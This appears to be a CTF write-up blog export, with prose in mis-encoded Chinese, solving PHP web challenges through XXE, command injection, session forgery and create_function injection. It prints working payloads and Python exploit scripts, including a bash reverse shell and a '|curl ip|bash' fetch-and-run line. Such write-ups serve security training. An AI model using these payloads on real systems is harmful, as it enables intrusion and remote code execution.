<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;eantosi&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="G2mtuå­¦ç”Ÿï¼Ÿ"><a href="#G2mtuå­¦ç”Ÿï¼Ÿ" class="headerlink" title="G2mtuå­¦ç”Ÿï¼Ÿ"></a>G2mtuå­¦ç”Ÿï¼Ÿ</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;0&quot;</span>, time()+<span class="number">360</span>);</span><br><span class="line"><span class="keyword">if</span>(@$_SERVER[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]!=<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;u no student in Gzmtu&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;user&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">	 <span class="keyword">echo</span> <span class="string">&quot;flag&#123;welcom_to_GZMTU_56456s4awdawdafafa&#125;&quot;</span>;		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;u no admin!&quot;</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>xffä¼ªé€ ipä¸º127.0.0.1ç„¶åæ”¹cookieæœªæˆæƒè®¿é—®å³å¯è·å–åˆ°flag</p>
<h3 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h3><p>è€ƒç‚¹</p>
<ul>
<li>XXEå¤–éƒ¨å®ä½“æ³¨å…¥</li>
</ul>
<p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$resp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//$flag=&#x27;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#x27;;</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="literal">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class=&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method=&quot;post&quot; class=&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">&quot;title&quot;</span>&gt;è¯·è¾“å…¥å§“å&lt;/h1&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;name entry &quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;button class=&quot;submit entry&quot; onclick=&quot;func()&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;shadow&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;\?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;\?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;feedback&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;author&gt;&#x27;</span> + document.getElementById(<span class="string">&#x27;name&#x27;</span>).value+ <span class="string">&#x27;&lt;/author&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;/feedback&gt;&#x27;</span>;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                document.getElementById(<span class="string">&#x27;title&#x27;</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;index.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯</p>
<p>xxeå¤–éƒ¨å®ä½“æ³¨å…¥+ä¼ªåè®®è¯»å–æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;feedback&gt;</span><br><span class="line">&lt;author&gt;&amp;xxe;&lt;/author&gt;</span><br><span class="line">&lt;/feedback&gt;</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…æ”¹ä¸€ä¸‹ï¼Œå†base64è§£å¯†å³å¯å¾—åˆ°flag</p>
<h3 id="æ— å‚æ•°RCE"><a href="#æ— å‚æ•°RCE" class="headerlink" title="æ— å‚æ•°RCE"></a>æ— å‚æ•°RCE</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤è¯¸å¤šï¼Œå°†å¸¸ç”¨çš„æ•°ç»„æ§åˆ¶å‡½æ•°ç»™banäº†ï¼Œsessionä¹Ÿbanäº†ï¼Œæ–‡ä»¶æ˜¾ç¤ºçš„<strong>show_souce</strong>ä»¥åŠ<strong>highlight_file</strong>ä¹Ÿæ²¡äº†ï¼Œèƒ½ç”¨çš„å‡½æ•°æŸ¥é˜…å®Œï¼Œæœ€ç»ˆæœ‰ä¸ªæ§åˆ¶æ•°ç»„çš„éšæœºæ•°å‡½æ•°<strong>array_rand</strong>ä»¥åŠæ–‡ä»¶<strong>file_get_contents</strong>ï¼Œé€‰æ‹©å½“å‰ç›®å½•çš„å‡½æ•°æœ‰ä¸ª<strong>current</strong>ç»„åˆèµ·æ¥å°±è¡Œäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åè¾¹åˆè¿‡æ»¤äº†flagï¼Œè€Œflagåœ¨flag.phpï¼Œè¯»åˆ°å°±ä¼šdieæ‰ï¼Œæ‰€ä»¥éœ€è¦åŠ å¯†ï¼Œå¸¸ç”¨çš„åŠ å¯†base64å·²ç»è¢«è¿‡æ»¤äº†ï¼Œé€‰æ‹©ä½¿ç”¨åå…­è¿›åˆ¶åŠ å¯†ï¼Œæœ€ç»ˆpayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>

<p>è¯»å–çš„æ—¶å€™æœ‰äº›æ–‡ä»¶ä¹Ÿä¼šè¢«è¯»å–è¿›æ¥ï¼Œå› ä¸ºæ˜¯éšæœºè¯»å–ï¼Œæ¯æ¬¡å‡ºç°ä¸ä¸€æ ·çš„åå…­è¿›åˆ¶ï¼Œéƒ½éœ€è¦å¤šè§£å¯†çœ‹çœ‹ï¼Œè§£å¯†ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> hex2bin(<span class="string">&quot;3c3f7068700d0a2f2f666c61677b31353166306361642d376338322d346164312d383230332d3536636333366461393564307d0d0a3f3e&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è§£å¼€å¾—flag</p>
<h3 id="ç¥å¥‡çš„è¾“å…¥æ¡†"><a href="#ç¥å¥‡çš„è¾“å…¥æ¡†" class="headerlink" title="ç¥å¥‡çš„è¾“å…¥æ¡†"></a>ç¥å¥‡çš„è¾“å…¥æ¡†</h3><p>è¿™é“é¢˜æ˜¯ä¸€é“æ— å›æ˜¾çš„pingå‘½ä»¤</p>
<p>é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[<span class="string">&#x27;submit&#x27;</span>]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[<span class="string">&#x27;site&#x27;</span>];</span><br><span class="line">            <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>è§£æ³•ä¸€</li>
</ul>
<p>åˆ©ç”¨<code>&gt;</code>æŠŠæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‘½ä»¤å†™å…¥æ–‡ä»¶é‡Œé¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|ls &gt; 1.txt</span><br></pre></td></tr></table></figure>

<p>è®¿é—®1.txtç„¶åçœ‹åˆ°flagggg.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cat flagggg.php&gt; 1.txt</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…åå¼•å·æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;cat flagggg.php&gt; 1.txt&#96;</span><br></pre></td></tr></table></figure>

<p>å³å¯å¾—åˆ°flag</p>
<ul>
<li>è§£æ³•äºŒ</li>
</ul>
<p>ç›´æ¥åå¼¹ä¸€ä¸ªshell</p>
<p>åœ¨vpsç›‘å¬1234ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>

<p>åœ¨vpsçš„/var/www/htmlå†™å…¥bashåå¼¹è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>ç„¶åå›åˆ°è¾“å…¥æ¡†ä¸‹è¾“å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|curl ip|bash</span><br></pre></td></tr></table></figure>

<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120730923.png" alt="image-20201119120730923"></p>
<p>tipsï¼šå› ä¸ºdockeré¶æœºçš„ç¯å¢ƒé—®é¢˜å¯èƒ½æ— æ³•å†™shellï¼Œä»¥åŠæ— æ³•ä½¿ç”¨dnslogå¤–å¸¦æ•°æ®ã€‚</p>
<h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>å¼±å£ä»¤admin/admin8888ç™»å½•åå°</p>
<ul>
<li>è§£æ³•ä¸€</li>
</ul>
<p>æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132632586.png" alt="image-20201119132632586"></p>
<p>æ’å…¥phpä»£ç </p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132855855.png" alt="image-20201119132855855"></p>
<p>æ”¹ä¸€ä¸‹é¡µé¢</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133034032.png" alt="image-20201119133034032"></p>
<p>ç„¶åç‚¹å‡»å‰å°çš„å…³äºæˆ‘ä»¬</p>
<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133206501.png" alt="image-20201119133206501"></p>
<p>ç‚¹è¿›å»å³å¯è·å¾—flag</p>
<ul>
<li>å…¶ä»–è§£æ³•</li>
</ul>
<p>ç™¾åº¦xiaocmsæ¼æ´ï¼Œæœ‰ç°æˆçš„getshellæ–¹æ³•</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>xmctf</title>
    <url>/2020/12/17/xmctf/</url>
    <content><![CDATA[<p>æ˜Ÿç›Ÿæˆ˜é˜Ÿçš„è€ƒæ ¸é¢˜ï¼Œä¸€å…±åšäº†8é“é¢˜ï¼Œè®°å½•ä¸€ä¸‹è§£é¢˜è¿‡ç¨‹<a id="more"></a></p>
<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201217195705321.png" alt="image-20201216234950487"></p>
<h3 id="web3-è€ƒæ ¸"><a href="#web3-è€ƒæ ¸" class="headerlink" title="web3-è€ƒæ ¸"></a>web3-è€ƒæ ¸</h3><p>é¢˜ç›®æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">&#x27;content&#x27;</span>] ? <span class="string">&quot;---mylocalnote---\n&quot;</span> . $_GET[<span class="string">&#x27;content&#x27;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">$name = @$_GET[<span class="string">&#x27;name&#x27;</span>] ? $_GET[<span class="string">&#x27;name&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">str_replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name);</span><br><span class="line">str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">&quot;/tmp/&quot;</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Thank u,<span class="subst">&#123;$_SESSION[&#x27;username&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æç¤ºflagåœ¨flag.phpä¸‹ï¼Œè®¿é—®æç¤º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">u are not admin,only admin can see flag!</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æç¤ºè¯´åªæœ‰adminæ‰å¯ä»¥çœ‹åˆ°flagï¼Œè¯´æ˜æˆ‘ä»¬éœ€è¦æ»¡è¶³<code>$_SESSION[&#39;username&#39;]=&#39;admin&#39;</code>ï¼Œåˆšå¥½é¢˜ç›®ä¸­åˆå­˜åœ¨<code>file_put_contents</code>å‡½æ•°å¯ä»¥å¾€<code>/tmp</code>ç›®å½•ä¸‹å†™æ–‡ä»¶ï¼Œä½¿ç”¨burpsuiteæŠ“åŒ…çš„æ—¶å€™çœ‹åˆ°æœ‰ä¸ªPHPSESSIDï¼Œå¯ä»¥æƒ³åˆ°phpä¸­é»˜è®¤å­˜å‚¨çš„æ–‡ä»¶åä¸º<code>sess_PHPSESSID</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾€é‡Œé¢å†™å…¥ä¼ªé€ ç”¨æˆ·çš„ä¿¡æ¯äº†ï¼Œphpé»˜è®¤çš„å­˜å‚¨å¼•æ“æ ¼å¼ä¸ºï¼šé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°å¤„ç†çš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™å…¥çš„ä¼ªé€ ä¿¡æ¯ä¸º<code>username|s:6:&#39;admin&#39;;</code>ï¼Œä½†æ˜¯é¢˜ç›®å‰é¢ç»™æˆ‘ä»¬æ‹¼æ¥äº†ä¸€ä¸²å­—ç¬¦<code>&quot;---mylocalnote---\n&quot;</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é—­åˆä¸€ä¸‹ï¼ŒæŠŠä»–å½“åšä¸€ä¸ªé”®å€¼ï¼Œå°±ä¸ä¼šå½±å“åˆ°æˆ‘ä»¬åé¢çš„ä¸œè¥¿äº†</p>
<p>ä¼ªé€ å¥½sessionä¿¡æ¯åï¼Œè®¿é—®flag.phpå³å¯è·å¾—flagï¼Œè¿™é‡Œç»™å‡ºexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8809/&quot;</span></span><br><span class="line">response = r.get(url)</span><br><span class="line">PHPSESSID = response.cookies[<span class="string">&quot;PHPSESSID&quot;</span>]</span><br><span class="line">payload = <span class="string">&#x27;?content=|N;username|s:5:&quot;admin&quot;;&amp;name=sess_&#x27;</span>+PHPSESSID</span><br><span class="line">r.get(url+payload)</span><br><span class="line">url2 = <span class="string">&quot;http://xmctf.top:8809/flag.php&quot;</span></span><br><span class="line">response2 = r.get(url2+payload)</span><br><span class="line">flag = response2.text</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216154253806.png" alt="image-20201217195705321"></p>
<h3 id="RCE-è®­ç»ƒ"><a href="#RCE-è®­ç»ƒ" class="headerlink" title="RCE-è®­ç»ƒ"></a>RCE-è®­ç»ƒ</h3><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($ip)) &#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(;|`| |&amp;|cp|mv|cat|tail|more|rev|tac|\*|\&#123;)/i&quot;</span>, $ip))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;hack&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;no!&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  var_dump($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨base64+<code>%09</code>ç»•ä¸€ä¸‹è¿‡æ»¤ï¼Œç›´æ¥æ‹¿ç¥¥äº‘æ¯Commandè¿™é¢˜çš„payloadå°±èƒ½æ‰“ï¼Œå…ˆç”¨<code>ls /</code>æ‰¾åˆ°flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œç„¶åç›´æ¥<code>cat /flag</code>å°±è¡Œäº†ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8931/&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;?ip=|echo%09%22Y2F0IC9mbGFn%22|base64%09-d|ba\s\h&#x27;</span></span><br><span class="line">response = r.get(url+payload)</span><br><span class="line">result = response.text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201216164519144.png" alt="image-20201216164519144"></p>
<h3 id="easy-web-è€ƒæ ¸"><a href="#easy-web-è€ƒæ ¸" class="headerlink" title="easy-web-è€ƒæ ¸"></a>easy-web-è€ƒæ ¸</h3><p>é¢˜ç›®æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">&quot;bad&quot;</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">&#x27;bad&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;badbad!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">&#x27;act&#x27;</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;check&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;666&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹çœ‹åˆ°<code>extract</code>å‡½æ•°åˆçœ‹åˆ°<code>$key</code>å¿…é¡»å…¨ç­‰äºbadï¼Œå¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨key=1å³å¯ç»•è¿‡ï¼Œç„¶åçœ‹åˆ°<code>$act($arg,&#39;&#39;);</code>ï¼Œåœ¨y1ngå¸ˆå‚…ä¹‹å‰å‡ºçš„ä¸€é“é¢˜ç›®[BJDCTF2020]EzPHPé‡Œé¢çœ‹åˆ° è¿‡ï¼Œä¸éš¾æƒ³åˆ°ç”¨<code>create_function</code>å‡½æ•°æ¥åšè¿™é“é¢˜ï¼Œé¦–å…ˆéœ€è¦ç”¨<code>\</code>æ¥ç»•è¿‡è¿™ä¸ªæ­£åˆ™ï¼Œç„¶å<code>create_function</code>è¿™ä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªparamæ˜¯å£°æ˜å˜é‡ï¼Œç¬¬äºŒä¸ªparamæ˜¯ä¼ é€’æ‰§è¡Œçš„ä»£ç </p>
<p>ç„¶åè¿™é“é¢˜ç›®ç¬¬äºŒä¸ªparamæ˜¯ä¸ºç©ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç¬¬ä¸€ä¸ªparamç”¨<code>)&#123;&#125;</code>æ¥é—­åˆå‰é¢çš„æ–¹æ³•ï¼Œç„¶åç”¨<code>//</code>æ¥æ³¨é‡Šåé¢æ²¡ç”¨çš„éƒ¨åˆ†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;)&#123;&#125;phpinfo();//&#x27;</span>;</span><br><span class="line">$myFunc = create_function($a,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="comment">//æ•ˆæœå¦‚ä¸‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"></span>)</span>&#123;&#125;phpinfo();<span class="comment">//)&#123;&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç›´æ¥ç»™ä¸ªexp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://xmctf.top:8848&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;?act=\create_function&amp;arg=)&#123;&#125;system(&quot;cat /ffflll4g&quot;);//&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">response = r.post(url+payload,data=data)</span><br><span class="line">result = response.text</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

